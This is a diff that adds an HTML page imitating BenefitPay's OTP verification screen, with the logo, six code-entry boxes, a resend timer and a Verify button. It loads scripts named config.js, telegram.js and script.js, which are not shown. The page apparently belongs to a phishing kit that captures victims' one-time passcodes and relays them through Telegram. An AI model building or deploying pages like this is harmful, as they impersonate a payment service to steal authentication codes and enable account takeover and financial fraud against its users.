@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - BenefitPay</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="mobile-frame">
+        <div class="mobile-screen">
+            <div class="container">
+                <!-- Header -->
+                <div class="header">
+                    <div class="logo-container">
+                        <img src="benefitpay-download.png" alt="BenefitPay Logo" class="logo">
+                    </div>
+                    <button class="lang-btn">عربي</button>
+                </div>
+
+                <!-- OTP Section -->
+                <div class="form-section">
+                    <h2 class="page-title">OTP Verification</h2>
+                    <p class="otp-description">Enter the OTP sent to your mobile number</p>
+
+                    <div class="otp-container" id="otpContainer">
+                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" id="otp1" oninput="handleOTPInput(1, event)" onkeydown="handleOTPKeyDown(1, event)">
+                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" id="otp2" oninput="handleOTPInput(2, event)" onkeydown="handleOTPKeyDown(2, event)">
+                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" id="otp3" oninput="handleOTPInput(3, event)" onkeydown="handleOTPKeyDown(3, event)">
+                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" id="otp4" oninput="handleOTPInput(4, event)" onkeydown="handleOTPKeyDown(4, event)">
+                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" id="otp5" oninput="handleOTPInput(5, event)" onkeydown="handleOTPKeyDown(5, event)">
+                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" id="otp6" oninput="handleOTPInput(6, event)" onkeydown="handleOTPKeyDown(6, event)">
+                    </div>
+                    <div class="error-message" id="otpError" style="display: none;"></div>
+                    <div class="resend-section">
+                        <button class="resend-btn" id="resendBtn" onclick="resendOTP()" disabled>
+                            <span id="resendText">Resend OTP</span>
+                            <span id="resendTimer" style="display: none;"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Verify Button -->
+                <button class="start-btn" onclick="verifyOTP()">Verify</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="telegram.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
+
